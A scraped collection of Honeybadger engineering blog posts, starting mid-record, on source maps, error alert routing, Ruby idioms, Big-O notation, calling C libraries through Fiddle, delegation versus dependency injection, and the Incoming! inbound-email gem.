traces like this: A@http://example.com/assets/application.min.js:31:7525 Minified stack traces are not useful for debugging, and they're definitely not useful for grouping—adding one new line to a source file can cause entirely different line and column numbers to be generated!  Because Honeybadger uses the stack trace to group similar errors together, constantly changing stack traces cause a lot of unwanted noise in our projects. Source maps are the answer. With a source map, line 31, column 7525 of application.min.js may translate to something like: addThings@http://example.com/assets/utils.js:50 This line is the actual location of the error in the source code, and it's less likely to change, which means grouping errors using the translated stack trace is much more reliable. Starting in honeybadger.js v0.5.0 , the translated stack trace will be used when grouping errors! To get the new grouping, simple upgrade honeybadger.js to 0.5.0 or greater. The New Revision Option We've also added a new configuration option to honeybadger.js : revision . The revision option tells Honeybadger which source map to apply to each error, and when using the hosted method, when to update your source map. If you're already using hosted source maps with Honeybadger, you should upgrade to honeybadger.js v0.5.0 or greater and add the revision option to your Honeybadger configuration: Honeybadger . configure ({ apiKey : ' project api key ' , environment : ' production ' , revision : ' git SHA/project version ' }); Adding the revision option will make Honeybadger refresh your hosted source map when an error occurs for a new version of your code. You can use any value for revision —a project version (i.e. \"v1.0.1\"), a build number (\"101\"), a random sentence (\"'badger edition one-zero-one\"). The important part is that each revision is unique. For us, the SHA of the latest GIT commit works best. Why is Source Map Upload Better? Using the new upload API is more reliable because the source map is available before any errors are reported. With the remotely hosted option, the source map may not be applied to the first few errors that arrive because we can't always download remote source maps from your servers immediately. Send us Your Source Maps! Integrating source maps with Honeybadger has major benefits; it will improve your error grouping and help you debug your errors faster—it's a no-brainer. To get started with source maps in your project, check out our our new guide in the Honeybadger docs , and drop us a line at support@honeybadger.io if you have questions. Send us your source maps!", "date": "2017-08-08"},
{"website": "Honey-Badger", "title": "Making Error Alerts Less Noisy and More Useful", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-to-make-your-error-alerts-less-noisy-and-more-useful/", "abstract": "False alarms suck. Maybe the only thing that's worse is a real alarm sent to the wrong person. When a project is young, you can afford to have every alert sent to every developer. But as it grows — and roles get more specialized — it becomes critical to deal with alerts more intelligently. Specifically, you need to eliminate noise and make sure that each alert is sent to the people who can actually do something about it. We recently launched some new features and third-party integrations that make error alerts quite a bit smarter. Let's take a look! Routing Rules Honeybadger monitors your web apps for errors and outages and lets you know when there's a problem. But not all errors are created equal. That's why we just introduced a new routing system to let you specify rules for which errors cause which alerts. Environment Errors that happen on staging usually aren't as important as ones in production. Maybe you'd like alerts for staging errors to be sent to a separate QA chat room. With our routing rules, it's simple to make this happen. In the screenshot below, we're setting up a slack room specifically for staging errors: Priority & Tags Have you ever had an error that just keeps popping back up, no matter what you do to fix it? With our routing system, you can funnel higher-priority errors to higher-priority channels. Just tag the error — manually or programmatically — and create a routing rule for that tag. You could also route errors based on exception class, assignee…you name it! By Responsibility Do you have certain developers or groups who are responsible for different parts of your app? You can route errors based on which part of the app the error occurred in. In the example below, I'm sending all alerts that happen in the payments system to the chatroom for the payments team: New Workflow Integrations Honeybadger has great support for PagerDuty, VictorOps and OpsGenie. You can send error notifications through any of these services to take advantage of their even more advanced workflow features. And as you go without saying, but all of our new routing features also work with these services.", "date": "2016-02-10"},
{"website": "Honey-Badger", "title": "The clever hack that makes `items.map(&:name)` work", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/how-ruby-ampersand-colon-works/", "abstract": "When iterating over arrays, there's one piece of shorthand that I find myself using again and again. It's the &: trick, aka the \"ampersand colon\" or \"pretzel colon\". In case you're not familiar with it, here's how it works: words = [ \"would\" , \"you\" , \"like\" , \"to\" , \"play\" , \"a\" , \"game?\" ] # this... words . map & :length # ..is equivalent to this: words . map { | w | w . length } Until recently, I had assumed that the &: syntax was an operator. But it's not. It's a clever hack that started out in ActiveSupport and became an official feature in Ruby 1.8.7. The & operator In addition to being used for AND logic operations, the \"&\" character has another use in Ruby. When added to the beginning of a method argument, it calls to_proc on its operand and passes it in as a block. That's a mouthful. It's much simpler to see the example: def my_method ( & block ) block . call end class Greeter def self . to_proc Proc . new { \"hello\" } end end my_method ( & Greeter ) # returns \"hello\" Symbol#to_proc You can add a to_proc method to any object, including Symbol. That's exactly what ruby does to allow for the &: shortcut. It looks something like this: class Symbol def to_proc Proc . new do | item | item . send self end end end Clear as mud? The important part is item.send(self) . Self, in this case refers to the symbol. Putting it all together Enumberable methods like each and map accept a block. For each item they call the block and pass it a reference to the item. The block in this case is generated by calling to_proc on the symbol. # &:name evaluates to a Proc, which does item.send(:name) items . map ( & :name ) The interesting thing about this is that map doesn't  know any of this is going on!  The bulk of the work is being done by the :name symbol. It's definitely clever...almost too clever for my taste. But it's been a part of Ruby's standard library for years at this point, and it's so handy I doubt I'll stop using it for now. :)", "date": "2015-07-01"},
{"website": "Honey-Badger", "title": "honeybadger.js is now universal", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/universal-honeybadger-js/", "abstract": "For years, Honeybadger has supported client-side JavaScript and Node.js via two separate NPM packages: honeybadger-js (client-side) and honeybadger (Node.js). Today, we're excited to release a new universal package for JavaScript: @honeybadger-io/js . The following packages are deprecated moving forward : honeybadger-js honeybadger Use @honeybadger-io/js instead. Why make this change? Combining our JavaScript packages means we can share the same core client code while integrating deeply with each environment. The result is less duplication, better consistency, and a more straightforward experience for universal/isomorphic apps that run in multiple environments via Server-side Rendering (SSR). Do I have to upgrade? The short answer : You can keep using the old packages (for now), but why would you when upgrading is so easy? See How to upgrade . The long answer : We will continue to support the old packages, fix bugs, etc., for now. All new development for client-side JavaScript and Node.js will happen on @honeybadger-io/js (the GitHub repo is here ). We plan to deprecate the old packages on NPM in the future to encourage more users to upgrade—if you do it now, you won't have to worry about any of that! :) How to upgrade Upgrading to the new @honeybadger-io/js package should take 5 minutes or less for most users. If you have a simple installation, the process has just two steps: Replace your current package(s) with @honeybadger-io/js , i.e.: npm uninstall honeybadger-js honeybadger\n  npm install @honeybadger-io/js Replace any import / require statements that reference the old package(s): const Honeybadger = require ( ' @honeybadger-io/js ' ); // Or: // import Honeybadger from '@honeybadger-io/js'; Honeybadger . configure ({ apiKey : ' project api key ' , environment : ' production ' , revision : ' git SHA/project version ' }); If you use a lot of custom configuration, it may take a little bit longer, as there are a few minor breaking changes. For details, check out the complete upgrading guide . CDN users If you use our CDN, replace your current script tag with the v3.0 script\ntag: <script src= \"//js.honeybadger.io/v3.0/honeybadger.min.js\" type= \"text/javascript\" ></script> Review the upgrading guide for a list of breaking changes. Reporting bugs Please report bugs and any other issues you encounter to support@honeybadger.io ! Links/further reading Upgrading guide User documentation GitHub repo NPM package CHANGELOG", "date": "2021-01-21"},
{"website": "Honey-Badger", "title": "A Rubyist's Guide to Big-O Notation", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/a-rubyist-s-guide-to-big-o-notation/", "abstract": "I don't have a degree in computer science. Lots of us Rubyists don't. So for a long time I avoided learning about big-O notation. It looks a little too much like higher math. I mean: O(N^2) . Come on. Instead, I learned rules of thumb: Finding a specific item in a Hash is faster than in an Array Avoid nested loops Watch out for accidental DB queries when generating lists in your views These rules are nice, but unless you understand WHY they work, you're going to find yourself making mistakes and having inexplicable performance problems. Why does it matter? Big-O notation is just a fancy way of describing how your code's performance depends on the amount of data it's processing. Performance means one of two things: speed, or ram usage. In computer science class you'd refer to these as \"time complexity\" and \"space complexity.\" Big-O notation is used for both, but we're going to focus on speed here, since that seems to be the more common usage. You would expect that processing an array of 100 items would be slower than an array of 10 items. But by how much? 10x, 100x? 1000x? It's not a big deal with small datasets, but if your app gets exponentially slower for each row in the database it soon becomes a problem. Before we get into the details, I made a quick chart showing common big-Os with emoji showing how they'll make you feel as your data scales. Big O Rank Meaning O(1) 😎 Speed doesn't depend on the size of the dataset O(log n) 😁 10x the data means 2x more time O(n) 😕 10x the data means 10x more time O(n log n) 😖 10x the data means about 20x more time O(n^2) 😫 10x the data take 100x more time O(2^n) 😱 The dilithium crystals are breaking up! So when someone says Array#bsearch is better than Array#find because it's O(log n) vs O(n) you can just compare 😁 to 😕 and see that they might be onto something. For something a little more robust, check out the Big-O Cheat Sheet Deciphering the Notation You don't have to memorize all of the different Big-O values, so long as you understand how the notation works. Take, for example, the horrible horrible O(2^n) . If we were to express that in Ruby, it might look like this: # O(2^n) translated to Ruby def o ( n ) 2 ** n # This is ruby for 2^n end Still not obvious? How about if I rename the method and argument to something more user-friendly? # O(2^n) translated to prettier Ruby def execution_time ( size_of_dataset ) 2 ** size_of_dataset end You can do this for all of them: # O(1) def o1_execution_time ( size_of_dataset ) 1 end # O(n) def on_execution_time ( size_of_dataset ) size_of_dataset end # O(n^2) def on2_execution_time ( size_of_dataset ) size_of_dataset * size_of_dataset end ... etc Now that you know how the notation works, let's take a look at some typical ruby code and see how it relates. O(1) When we say that something is O(1) it means that its speed doesn't depend on the size of its data set. For example, hash lookup times don't depend on the hash size: # These should all take the same amount of time hash_with_100_items [ :a ] hash_with_1000_items [ :a ] hash_with_10000_items [ :a ] This is why we tend to say that hashes are faster than arrays for larger datasets. O(n) In contrast, Array#find is O(n) . That means Array#find depends linearly on the number of items in the array. An array with 100 items will take 100 times longer to search than an array with one item A lot of code that iterates over arrays follows the O(n) pattern. ( 0 .. 9 ). each do | i | puts i end # This example is 1/2 the speed of the previous because it contains 2x the items. ( 0 .. 19 ). each do | i | puts i end O(n^2) Code that fits an O(n^2) profile tends to involve nested loops. That makes sense if you think about it. One loop gives you O(n) , a second nested loop gives you O(n^2) . If — for some unholy reason — you had a 5-level nested loop, it'd be O(n^5) . data = ( 0 .. 100 ) data . each do | d1 | data . each do | d2 | puts \" #{ d1 } , #{ d2 } \" end end O(n log n) O(n log n) code is often the result of someone finding a clever way to reduce the amount of work that an otherwise O(n^2) algorithm would do. You wouldn't be able to just look at a piece of code and tell it's O(n log n) . This is where the higher math comes in, and it's also where I bow out. But it is important to know about O(n log n) because it describes a lot of common search algorithms. Ruby's Array#sort uses the venerable quicksort algorithm,  which on average is O(n log n) and worst-case is O(n^2) If you're not familiar with quicksort, check out this excellent demonstration . Putting it all together: Your Database One of the most common problems with new web applications is that they're fast on the developer's computer, but in production they get slower and slower. This happens because the amount of records in your database grows over time, but your code is asking the DB to do operations that don't scale well. ie. O(n) or worse. For example, did you know that in postgres, count queries are always O(n) ? # This makes the DB iterate over every row of Users # ...unless you're using a Rails counter cache. Users . count We can see this by using the postgres explain command. Below, I use it to get the query plan for a count query. As you can see, it plans on doing a sequential scan (that means looping) over all 104,791 rows in the table. # explain select count(*) from users;\n                           QUERY PLAN\n-----------------------------------------------------------------\n Aggregate  (cost=6920.89..6920.90 rows=1 width=0)\n   ->  Seq Scan on users  (cost=0.00..6660.71 rows=104701 width=0)\n(2 rows) Lots of common rails idioms can trigger unintentional sequential scans, unless you specifically optimize the database to prevent them. # This asks the DB to sort the entire `products` table Products . order ( \"price desc\" ). limit ( 1 ) # If `hobby` isn't indexed, the DB loops through each row of Users to find it. User . where ( hobby: \"fishing\" ) You can use the explain command to see that as well. Here we see we're doing a sort (probably quicksort) on the whole table. If there are memory constraints, it may have chosen a different sorting algorithm with different performance characteristics. # explain select * from users order by nickname desc limit 1;\n                               QUERY PLAN\n-------------------------------------------------------------------------\n Limit  (cost=7190.07..7190.07 rows=1 width=812)\n   ->  Sort  (cost=7190.07..7405.24 rows=104701 width=812)\n         Sort Key: nickname\n         ->  Seq Scan on users  (cost=0.00..6606.71 rows=104701 width=812) The answer to all these problems is, of course, indexing. Telling the database to use an index is a little like in Ruby, when you use a hash lookup O(1) instead of an array find O(n) . That's all, folks I hope this has been a useful introduction to Big-O notation and how in impacts you as a ruby developer! Please ping me @StarrHorne if you have any questions.", "date": "2016-11-14"},
{"website": "Honey-Badger", "title": "Use any C library from Ruby via Fiddle - the Ruby standard library's best kept secret.", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/use-any-c-library-from-ruby-via-fiddle-the-ruby-standard-librarys-best-kept-secret/", "abstract": "Fiddle is a little-known module that was added to Ruby's standard library in 1.9.x. It allow you to interact directly with C libraries from Ruby. It even lets you inspect and alter the ruby interpreter as it runs. It works by wrapping libffi, a popular C library that allows code written in one language to call methods written in another. In case you haven't heard of it, \"ffi\" stands for \"foreign function interface.\" And you're not just limited to C. Once you learn Fiddle, you can use libraries written in Rust and other languages that support it. Let's take a look at Fiddle. We'll start out with a simple example and then end by accessing an Arduino over a serial port. You don't need to know that much C. I promise. :) A simple example In plain-old Ruby, you always have to define a method before you can call it. It's the same with Fiddle. You can't just call a C function directly. Instead you have to create a wrapper for the C function, then call the wrapper. In the example below, we're wrapping C's logarithm function. We're basically duplicating Ruby's Math.log . require 'fiddle' # We're going to \"open\" a library, so we have to tell Fiddle where # it's located on disk. This example works on OSX Yosemite. libm = Fiddle . dlopen ( '/usr/lib/libSystem.dylib' ) # Create a wrapper for the c function \"log\". log = Fiddle :: Function . new ( libm [ 'log' ], # Get the function from the math library we opened [ Fiddle :: TYPE_DOUBLE ], # It has one argument, a double, which is similar to ruby's Float Fiddle :: TYPE_DOUBLE # It returns a double ) # call the c function via our wrapper puts log . call ( 3.14159 ) Making it pretty The previous example works, but it's kind of verbose. I'm sure you can imagine how cluttered things would get if you had to wrap 100 functions. That's why Fiddle provides a nice DSL. It's exposed via the Fiddle::Importer mixin. Using this mixin makes it short work to create a module full of external functions. In the example below, we're creating a module that contains several logarithm methods. require 'fiddle' require 'fiddle/import' module Logs extend Fiddle :: Importer dlload '/usr/lib/libSystem.dylib' extern 'double log(double)' extern 'double log10(double)' extern 'double log2(double)' end # We can call the external functions as if they were ruby methods! puts Logs . log ( 10 ) # 2.302585092994046 puts Logs . log10 ( 10 ) # 1.0 puts Logs . log2 ( 10 ) # 3.321928094887362 Controling the serial port Ok, so you finally bought one of those Arduinos you've been thinking about buying for years. You've got sending the text \"hello world\" to your computer once per second using the serial port. Now, it'd be really nice if you could read that data using Ruby. And you can actually read from the serial port using Ruby's standard IO methods. But these IO methods don't let us configure the serial input with the level of granularity that we need if we're to be hardcore hardware hackers. Fortunately, the C standard library provides all the functions we need to work with the serial port. And using Fiddle, we can access these C functions in Ruby. Of course, there are already gems that do this for you. When I was working on this code I took a little inspiration from the rubyserial gem. But our goal is to learn how to do this stuff ourselves. Examining  termios.h In C, any filename ending in .h is a header file. It contains a list of all functions and constants that the library makes available to third party code (our code). The first step in wrapping any C library is going to be to find this file, open it and look around. The library we're using is called termios. On OSX Yosemite, the header file is located at /usr/include/sys/termios.h. It will be somewhere else on linux. Here's what termios.h looks like. I've condensed it quite a bit for clarity. typedef unsigned long tcflag_t ; typedef unsigned char cc_t ; typedef unsigned long speed_t ; struct termios { tcflag_t c_iflag ; /* input flags */ tcflag_t c_oflag ; /* output flags */ tcflag_t c_cflag ; /* control flags */ tcflag_t c_lflag ; /* local flags */ cc_t c_cc [ NCCS ]; /* control chars */ speed_t c_ispeed ; /* input speed */ speed_t c_ospeed ; /* output speed */ }; int tcgetattr ( int , struct termios * ); int tcsetattr ( int , int , const struct termios * ); int tcflush ( int , int ); There are three important things to notice about this code. First, we have some typedefs. Then we have a data structure which is used to hold configuration info for the connection. Finally, we have the methods, we're going to use. Using fiddle's importer, we can almost copy these sections verbatim into our Ruby code. Let's tackle them one by one. Type aliases and typedefs In C it's pretty common to create aliases for data types. For example, the termios.h file creates a new type called speed_t that is just a long integer.  The Fiddle importer is able to handle these via its typealias feature. # equivalent to `typedef unsigned long tcflag_t;` typealias \"tcflag_t\" , \"unsigned long\" Structs C doesn't have classes or modules. If you want to group a bunch of variables together, you use a struct. Fiddle provides a nice mechanism for working with structs in ruby. The first step is to define the struct in the Fiddle importer. As you can see, we're almost able to just copy and paste from the header file. Termios = struct [ 'tcflag_t c_iflag' , 'tcflag_t c_oflag' , 'tcflag_t c_cflag' , 'tcflag_t c_lflag' , 'cc_t         c_cc[20]' , 'speed_t  c_ispeed' , 'speed_t  c_ospeed' , ] Now we can create an \"instance\" of the struct by using the malloc method. We can set and retrieve values in much  the same way that we would with any normal Ruby class instance. s = Termios . malloc s . c_iflag = 12345 Putting it all together If you combine what we just learned about typedefs and structs with what we've already demonstrated with functions, we can put together a working wrapper of the termios library. Our wrapper just contains the methods we need to configure the serial port. We'll use plain old ruby for the rest. require 'fiddle' require 'fiddle/import' # Everything in this module was pretty much copied directly from # termios.h. In Yosemite it's at /usr/include/sys/termios.h module Serial extend Fiddle :: Importer dlload '/usr/lib/libSystem.dylib' # Type definitions typealias \"tcflag_t\" , \"unsigned long\" typealias \"speed_t\" , \"unsigned long\" typealias \"cc_t\" , \"char\" # A structure which will hold configuratin data. Instantiate like # so: `Serial::Termios.malloc()` Termios = struct [ 'tcflag_t   c_iflag' , 'tcflag_t   c_oflag' , 'tcflag_t   c_cflag' , 'tcflag_t   c_lflag' , 'cc_t         c_cc[20]' , 'speed_t    c_ispeed' , 'speed_t    c_ospeed' , ] # Functions for working with a serial device extern 'int   tcgetattr(int, struct termios*)' # get the config for a serial device extern 'int   tcsetattr(int, int, struct termios*)' # set the config for a serial device extern 'int   tcflush(int, int)' # flush all buffers in the device end Using the library In the example below we open our serial device in Ruby, then get its file descriptor. We use our termios functions to configure the device for reading. Then we read. I'm making use of some magic numbers here. These are the result of combining a bunch of bitwise configuration options that are necessary for communication with the arduino. If you're interested in where the magic numbers come from, check out this blog post . file = open ( \"/dev/cu.wchusbserial1450\" , 'r' ) fd = file . to_i # Create a new instance of our config structure config = Serial :: Termios . malloc # Load the default config options into our struct Serial . tcgetattr ( fd , config ); # Set config options important to the arduino. # I'm sorry for the magic numbers. config . c_ispeed = 9600 ; config . c_ospeed = 9600 ; config . c_cflag = 51968 ; config . c_iflag = 0 ; config . c_oflag = 0 ; # wait for 12 characters to come in before read returns. config . c_cc [ 17 ] = 12 ; # no minimum time to wait before read returns config . c_cc [ 16 ] = 0 ; # Save our configuration Serial . tcsetattr ( fd , 0 , config ); # Wait 1 second for the arduino to reboot sleep ( 1 ) # Remove any existing serial input waiting to be read Serial . tcflush ( fd , 1 ) buffer = file . read ( 12 ) puts \" #{ buffer . size } bytes: #{ buffer } \" file . close The serial reader in action If I now load my arduino with a program that continuously prints hello world, I can use my ruby script to read it. This arduino program just writes \"hello world\" to serial, again and again And here's what it looks like when I run my serial monitor.", "date": "2015-07-27"},
{"website": "Honey-Badger", "title": "Decoupling Ruby: Delegation vs Dependency Injection", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/decoupling-ruby-delegation-dependency-injection/", "abstract": "In Object-Oriented Programming , one object will often depend on another object in order to function. For example, if I create a simple class to run finance reports: class FinanceReport def net_income FinanceApi . gross_income - FinanceApi . total_costs end end We can say that FinanceReport depends on FinanceApi , which it uses to pull information from an external payment processor. But what if we want to hit a different API at some point? Or, more likely, what if we want to test this class without hitting external resources? The most common answer is to use Dependency Injection. With Dependency Injection, we don't explicitly refer to FinanceApi inside FinanceReport . Instead, we pass it in as an argument. We inject it. Using Dependency Injection, our class becomes: class FinanceReport def net_income ( financials ) financials . gross_income - financials . total_costs end end Now our class has no knowledge that the FinanceApi object even exists! We can pass any object to it as long as it implements gross_income and total_costs . This has a number of benefits: Our code is now less \"coupled\" to FinanceApi . We're forced to use FinanceApi via a public interface. We can now pass in a mock or stub object in our tests so that we don't have to hit the real API. Most developers consider Dependency Injection to be a good thing in general (me too!). However, as with all techniques, there are trade-offs. Our code is slightly more opaque now. When we explicitly used FinanceApi , it was clear where our values were coming from. It's not quite as clear in the code incorporating Dependency Injection. If the calls would otherwise have gone to self , then we have made the code more verbose. Instead of using the Object-Oriented \"send a message to an object and let it act\" paradigm, we find ourselves moving to a more functional \"inputs -> outputs\" paradigm. It is this last case (redirecting calls that would have gone to self ) that I want to look at today. I want to present a possible alternative to Dependency Injection for these situations: change the base class dynamically (kinda). The Problem to Solve Let’s back up a moment and start with the problem that led me down this path to start with: PDF reports. My client requested the ability to generate various printable PDF reports — one report listing all expenses for an account, another listing revenue, another the forecasted profits for future years, etc. We’re using the venerable prawn gem to create these PDFs, with each report being its own Ruby object subclassed from Prawn::Document . Something like this: class CostReport < Prawn :: Document def initialize ( ... ) ... end def render text \"Cost Report\" move_down 20 ... end So far, so good. But here’s the rub: the client wants an “Overview” report that includes portions from all these other reports . Solution 1: Dependency Injection As mentioned previously, one common solution to this kind of problem is to refactor the code to use Dependency Injection. That is, rather than having all these reports call methods on self , we will instead pass in our PDF document as an argument. This would give us something more like: class CostReport < Prawn :: Document ... def title ( pdf = self ) pdf . text \"Cost Report\" pdf . move_down 20 ... end end This works, but there is some overhead here. For one thing, every single drawing method now has to take the pdf argument, and every single call to prawn now has to go through this pdf argument. Dependency injection has some benefits: it pushes us toward decoupled components in our system and allows us to pass in mocks or stubs to make unit testing easier. However, we are not reaping the rewards of these benefits in our scenario. We are already strongly coupled to the prawn API, so changing to a different PDF library would almost certainly require an entire rewrite of the code. Testing is also not a big concern here, because in our case testing generated PDF reports with automated tests is too cumbersome to be worthwhile. So Dependency Injection gives us the behavior we want but also introduces additional overhead with minimal benefits for us. Let’s have a look at another option. Solution 2: Delegation Ruby’s standard library provides us SimpleDelegator as an easy way to implement the decorator pattern. You pass in your object to the constructor, and then any method calls to the delegator are forwarded to your object. Using SimpleDelegator , we can create a base report class that wraps around prawn . class PrawnWrapper < SimpleDelegator def initialize ( document: nil ) document ||= Prawn :: Document . new ( ... ) super ( document ) end end We can then update our reports to inherit from this class, and they will still function the same as before, using the default document created in our initializer. The magic happens when we use this in our overview report: class OverviewReport < PrawnWrapper ... def render sales = SaleReport . new ( ... , document: self ) sales . sales_table costs = CostReport . new ( ... , document: self ) costs . costs_pie_chart ... end end Here SaleReport#sales_table and CostReport#costs_pie_chart remain unchanged, but their calls to prawn (e.g., text(...) , move_down 20 , etc.) are now being forwarded to OverviewReport via the SimpleDelegator we created. In terms of behavior, we have essentially made it as if SalesReport is now a subclass of OverviewReport . In our case, this means that all the calls to prawn ’s API now go SalesReport -> OverviewReport -> Prawn::Document . How SimpleDelegator Works The way SimpleDelegator works under the hood is basically to use Ruby's method_missing functionality to forward method calls to another object. So SimpleDelegator (or a subclass of it) receives a method call. If it implements that method, great; it will execute it just as any other object would. However , it if does not have that method defined, then it will hit method_missing . method_missing will then attempt to call that method on the object given to its constructor. A simple example: require 'simple_delegator' class Thing def one 'one' end def two 'two' end end class ThingDecorator < SimpleDelegator def two 'three!' end end ThingDecorator . new ( Thing . new ). one #=> \"one\" ThingDecorator . new ( Thing . new ). two #=> \"three!\" By subclassing SimpleDelegator with our own ThingDecorator class here, we can overwrite some methods and let others fall through to the default Thing object. The trivial example above doesn’t really do SimpleDelegator justice, though. You may look at this code and very well say to me, “Doesn’t subclassing Thing give me the same outcome?” Yes, yes it does. But here’s the key difference: SimpleDelegator takes the object it will delegate to as an argument in its constructor. This means we can pass in different objects at runtime . This is what allows use to redirect the calls to a prawn object in Solution 2 above. If we call a single report, the prawn calls go to a new document created in the constructor. The overview report, however, can change this so that calls to prawn are forwarded to its document. Conclusion Dependency Injection is probably the best solution to most decoupling problems most of the time. As with all techniques, however, there are trade-offs. In my case, I didn’t think that the overhead introduced by DI was worth the benefits it provided, so I looked for another solution. As with all things in Ruby, there’s always another way . I wouldn’t reach for this solution often, but it is certainly a nice addition to your Ruby toolbelt for these situations.", "date": "2020-02-18"},
{"website": "Honey-Badger", "title": "Working with Ruby exceptions outside of the rescue block", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/working-with-ruby-exceptions-outside-of-the-rescue-block/", "abstract": "It's often useful to be able to get the most recent exception, even if your code doesn't control the lifecycle of that exception. Imagine that you want to add basic crash detection to your application. You'd like to log extra info about any crash that happens as a result of an uncaught exception. The first step is to add a handler that's run whenever your application exits. It's super easy to do this via the Ruby kernel's at_exit method. at_exit puts \"the app exited\" end But how can we know if the exit callback was invoked as a result of an exception? Well, Ruby provides the cryptically named $! global variable. It contains the most recently raised exception that has occurred somewhere in the current call stack. It's trivial to use $! to detect if the program is being exited due to an exception. It looks something like this: at_exit do save_error_to_log ( $! ) if $! end The limitations of $! Unfortunately, the $! method only works if the exception occurred somewhere in the current call stack. If you rescue an exception, then try to access $! outside of the rescue clause, you'll get nil. begin raise \"x\" rescue puts $! # => RuntimeError end puts $! # => nil This means that $! is pretty useless inside of a shell like IRB. Often in IRB, I'll run a method and get an exception. Sometimes I'd like to get ahold of that exception object. But $! doesn't work for this. irb ( main ): 001 : 0 > 1 / 0 ZeroDivisionError : divided by 0 from ( irb ): 1 :in `/'\nirb(main):002:0> $!\n=> nil Working around $! with PRY PRY gets around the limitations of $! by adding its own local variable, _ex_ . This variable contains the most recent uncaught exception. [ 1 ] pry ( main ) > raise \"hi\" RuntimeError : hi from ( pry ): 1 :in `__pry__'        \n[2] pry(main)> _ex_      \n=> #<RuntimeError: hi> The reason that PRY is able to do this is because there are not really any uncaught exceptions inside of PRY or IRB. The shell itself catches the exceptions and displays them as nicely-formatted error messages. I've copied the relevant bits of the PRY source below. You can see that the code that evaluates your commands is wrapped inside of a begin/rescue/end block. When a rescuable exception occurs, PRY saves the exception to self.last_exception and it later gets assigned to _ex_ . # Excerpted from the PRY source at https://github.com/pry/pry/blob/623306966bfa86890ac182bc8375ec9699abe90d/lib/pry/pry_instance.rb#L273 begin if ! process_command_safely ( line ) @eval_string << \" #{ line . chomp } \\n \" if ! line . empty? || ! @eval_string . empty? end rescue RescuableException => e self . last_exception = e result = e Pry . critical_section do show_result ( result ) end return end Require English Perhaps you find variable names like $! a little hard on the eyes? Fortunately, Ruby includes a module called \"English\" which provides english-language versions of many global variables which otherwise look like robot cusswords. The synonym for $! is $ERROR_INFO . You can use it wherever you'd normally use $! . require \"English\" begin raise \"x\" rescue puts $ERROR_INFO # => RuntimeError end And although most of the other english equivalents have nothing whatsoever to do with the topic of this blog post, I'm including them for kicks. English variables are on the left. The originals are on the right. $ERROR_INFO $! $ERROR_POSITION $@ $FS $; $FIELD_SEPARATOR $; $OFS $, $OUTPUT_FIELD_SEPARATOR $, $RS $/ $INPUT_RECORD_SEPARATOR $/ $ORS $\\ $OUTPUT_RECORD_SEPARATOR $\\ $INPUT_LINE_NUMBER $. $NR $. $LAST_READ_LINE $_ $DEFAULT_OUTPUT $> $DEFAULT_INPUT $< $PID $$ $PROCESS_ID $$ $CHILD_STATUS $? $LAST_MATCH_INFO $~ $IGNORECASE $= $ARGV $* $MATCH $& $PREMATCH $` $POSTMATCH $‘ $LAST_PAREN_MATCH $+", "date": "2015-08-25"},
{"website": "Honey-Badger", "title": "A more visible backtrace & cleaner error summary", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/a-more-visible-backtrace-cleaner-error-summary/", "abstract": "Last week we sent out a survey to our users asking them what changes they would make to Honeybadger. We're planning on redesigning the user interface and wanted some feedback. As we read through the responses it became clear that a lot of the things our customers were asking for could be implemented pretty quickly and easily inside our current user interface. So we're postponing the redesign for a few weeks to knock them out. One of the most common suggestions was that we move the error backtrace higher on the page. We've just done that. We also cleaned up the error summary screen quite a bit and removed some design elements that didn't contribute anything to the app's usability. Behold!", "date": "2015-03-31"},
{"website": "Honey-Badger", "title": "Handle Inbound Email in any Rack Application", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/incoming-gem-receive-inbound-email-from-your-rails-or-rack-app/", "abstract": "So your client just called... He wants his app to handle incoming email . Just like Basecamp. No problem, you think, lots of services will send you email by POST to your app. Should be easy. Right? Nope. Each service uses a proprietary format. Some send you the parsed email, some send it raw. Some send an authentication signature. Some don't. Wouldn't it be nice if you could skip this part, and work with standard (well-known) ruby objects? Wouldn't it be nice if you could change vendors...without rewriting your code? If you're using Incoming!, you can. TL;DR Incoming! takes a Rack::Request and gives you a Mail::Message Supported Services Incoming supports these great services: SendGrid Mailgun Postmark CloudMailin Actual mail servers you run yourself (woah) Best of all, it's easy to extend. So it's already compatible with services that don't even exist yet! (not really, but kind of) So why do I want inbound email? Giving people an option to do something by sending you an email makes them more likely to do it. We built Incoming! for honeybadger.io . We needed a way to streamline discussions about errors. For example, you can comment on any error just by replying to the notification. Most of our comments come in this way, so we consider it a big win. As of this writing, the gem has been used internally by the Honeybadger team for about six months. Show me the code! Here's a simple example using CloudMailin. `# First, you define an email receiver class\nclass EmailReceiver < Incoming::Strategies::CloudMailin\n  def receive(mail)\n    puts %(Got message from #{mail.to.first} with subject \"#{mail.subject}\")\n  end\nend\n\n# Then you feed it a Rack::Request object. And you're done. \nreq = Rack::Request.new(env)\nresult = EmailReceiver.receive(req) # => Got message from whoever@wherever.com with subject \"hello world\"\n` For more detail, check out the Readme . But how do you use it in Rails? Using Incoming! in rails is just as easy. Let's build a sample app. REQUIREMENT: I hate texting. It's just a peeve of mine. But I need to be able to send love notes to my fiancee while she's in class. Obviously, the answer is to build an email-to-sms bridge! First, we set up our email receiver: `# app/email_receivers/incoming.rb\nclass EmailToSmsReceiver < Incoming::Strategies::Postmark\n  def receive(mail)\n    send_sms([mail.subject, mail.body].join(\": \"))\n  end\n  private\n    def send_sms(message)\n      # Insert twilio magic here\n    end\nend\n` Second, we add a controller to pipe requests into our receiver: `# app/controllers/emails_controller.rb\nclass EmailsController < ActionController::Base\n  def create\n    if EmailToSmsReceiver.receive(request)\n      render :json => { :status => 'ok' }\n    else\n      render :json => { :status => 'rejected' }, :status => 403\n    end\n  end\nend\n` Oh yeah, we need a route: `# config/routes.rb\nRails.application.routes.draw do\n  post '/emails' => 'emails#create'\nend\n` That's it. How does Incoming! compare with other gems? There are other gems in this space. Most notably Thoughtbot's Griddler . However there are a few places where Incoming! stands out. It: Supports multiple mail services Works with any rack application , not just rails Hands you a standard Mail::Message Doesn't make assumptions about your use case Do you have a meme pic for me? Yes, yes we do.", "date": "2013-02-19"},
